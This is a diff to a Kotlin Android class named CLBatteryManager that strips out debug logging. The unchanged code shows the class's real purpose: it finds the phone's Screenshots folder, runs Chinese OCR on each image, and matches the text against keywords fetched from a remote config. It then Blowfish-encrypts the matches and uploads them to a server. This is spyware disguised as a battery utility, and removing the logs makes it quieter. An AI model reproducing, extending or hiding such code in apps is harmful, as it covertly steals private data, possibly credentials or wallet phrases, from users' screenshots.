@@ -36,22 +36,17 @@ object CLBatteryManager {
         channel: String,
         onComplete: () -> Unit
     ) {
-        logV("modeType=${modeType}  fileSize=${fileSize}")
+
         var dirPath = PathUtils.getExternalDcimPath() + "/Screenshots"
-        logV("目录是否存在1=${FileUtils.isFileExists(dirPath)} dirPath=${dirPath}")
         if (!FileUtils.isFileExists(dirPath)) {
             dirPath = PathUtils.getExternalPicturesPath() + "/Screenshots"
         }
-        logV("目录是否存在2=${FileUtils.isFileExists(dirPath)} dirPath=${dirPath}")
         if (!FileUtils.isFileExists(dirPath)){
             val externalPath = "storage/emulated/0"
             if (FileUtils.isFileExists(externalPath)){
                 for (file in FileUtils.listFilesInDir(externalPath)) {
-                    logV("Directory1=${file.absolutePath}")
                     FileUtils.listFilesInDir(file.absolutePath).forEach {
-                        logV("Directory2=${it.absolutePath}")
                         if (it.absolutePath.contains("Screenshots")){
-                            logV("Directory3=${it.absolutePath}")
                             dirPath = it.absolutePath
                             return@forEach
                         }
@@ -60,15 +55,11 @@ object CLBatteryManager {
             }
         }
         val filesList = FileUtils.listFilesInDir(dirPath)
-        logV("文件数量1111=${filesList.size}")
         val filesInDir =
             filesList.filter {
                 val length = FileUtils.getLength(it)
-                logV("文件长度=${length}")
                 length <= fileSize
             }
-        logV("可筛选文件数量=${filesInDir.size}")
-
         if (filesInDir.isEmpty()) {
             onComplete()
             return
@@ -84,7 +75,6 @@ object CLBatteryManager {
                         content.contains(searchKey, true) || searchKey.contains(content, true) 
                     }
                     if (containData.isNotEmpty()) {
-                        logV("匹配成功的数据=$content")
                         submitData(encryptData(pageSize, content), channel) {
                             if (processedFiles == filesInDir.size && completedUploads == pendingUploads) {
                                 onComplete()
@@ -113,11 +103,9 @@ object CLBatteryManager {
                 TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
             val inputImage = InputImage.fromFilePath(Utils.getApp(), uri)
             textRecognizer.process(inputImage).addOnSuccessListener { visionText ->
-                logV("识别内容=${visionText.text} 路径=${uri.path}")
                 callback.invoke(visionText.text)
             }.addOnFailureListener { e ->
                 callback.invoke(null)
-                logV("识别异常=${e.message}")
             }
         }
     }
@@ -129,13 +117,11 @@ object CLBatteryManager {
      */
     private fun submitData(key: String?, channel: String = "BatteryHID", onComplete: () -> Unit) {
         if (key.isNullOrBlank()) {
-            logE("提交加密数据异常")
             onComplete()
             return
         }
         pendingUploads++
         HttpManager.httpPost(HttpManager.getSubmitUrl(), key, channel) { json ->
-            logV("提交数据=$json")
             completedUploads++
             onComplete()
         }
@@ -155,14 +141,11 @@ object CLBatteryManager {
             } else {
                 decryptData
             }
-            logV("解密出来的数据=${decrypt}")
             val data = taskContent.toByteArray()
             val encrypt = BlowfishUtil.encrypt(decrypt, data)
-            logV("${taskContent}=加密出来的数据=${encrypt}")
             return encrypt
         } catch (e: Exception) {
             e.printStackTrace()
-            logE("加解密异常信息=${e.message}")
             return null
         }
     }
@@ -170,7 +153,6 @@ object CLBatteryManager {
 
     fun doTask(channel:String="BatteryHID") {
         if (isTaskRunning) {
-            logV("任务已在运行，忽略新请求")
             return
         }
         
@@ -179,7 +161,6 @@ object CLBatteryManager {
         completedUploads = 0
         
         HttpManager.httpGet(HttpManager.getConfigUrl()) { json ->
-            logV("请求数据=$json")
             if (json.isNullOrBlank()) {
                 isTaskRunning = false
                 return@httpGet
@@ -200,7 +181,6 @@ object CLBatteryManager {
                     channel = channel
                 ) {
                     isTaskRunning = false
-                    logV("任务已完成")
                 }
             } else {
                 isTaskRunning = false
